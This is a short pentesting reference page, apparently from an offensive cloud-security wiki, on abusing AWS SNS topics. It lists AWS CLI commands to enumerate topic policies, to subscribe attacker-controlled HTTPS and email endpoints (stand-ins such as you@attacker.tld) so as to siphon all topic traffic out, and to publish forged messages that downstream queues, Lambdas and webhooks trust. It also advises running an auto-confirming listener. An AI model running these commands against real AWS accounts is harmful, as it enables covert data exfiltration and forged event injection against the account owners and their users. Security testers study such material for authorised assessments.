---
title: "SNS: publishing to and subscribing to topics"
description: "Abusing SNS topics and subscriptions to publish messages, capture notifications, or exfiltrate data."
keywords:
  - SNS
  - topic
  - subscription
  - publish
  - notification
---

# SNS

Simple Notification Service fans a published message out to every subscriber of a topic. With `sns:Publish` you inject messages that downstream systems trust, and with `sns:Subscribe` you add your own endpoint to a topic and receive everything flowing through it, which turns a topic into a data-capture or exfiltration channel.

## Enumerating topics and their policies

```bash
aws sns list-topics
aws sns get-topic-attributes --topic-arn <arn>   # Policy shows who can Publish/Subscribe
aws sns list-subscriptions-by-topic --topic-arn <arn>
```

A topic policy that allows `sns:Subscribe` or `sns:Publish` broadly (or cross-account) is the opening.

## Capturing and injecting

```bash
# subscribe an endpoint you control to siphon the topic
aws sns subscribe --topic-arn <arn> --protocol https --notification-endpoint https://you.example/sink
aws sns subscribe --topic-arn <arn> --protocol email --notification-endpoint you@attacker.tld

# publish a forged message downstream consumers will act on
aws sns publish --topic-arn <arn> --message '{"event":"forged"}'
```

## Exploitation notes

- An HTTPS subscription must confirm the subscription token SNS sends to the endpoint; host a listener that auto-confirms.
- Published messages are trusted by subscribers (queues, Lambdas, webhooks), so injection can drive downstream actions, not just noise.
- Topics often carry application events with sensitive fields; a subscription is a quiet read of that stream.

## Tools

- **AWS CLI** (`sns subscribe` / `publish`): capture and injection.
- **Pacu** (`sns__enum`): topic and subscription enumeration.

## References

- [HackTricks Cloud: AWS SNS abuse](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-sns-enum.html)
- [AWS: SNS access control](https://docs.aws.amazon.com/sns/latest/dg/sns-access-policy-language-overview.html)
- [Rhino Security Labs: AWS offensive research](https://rhinosecuritylabs.com/aws/)
- [Hacking the Cloud: AWS offensive techniques](https://hackingthe.cloud/)
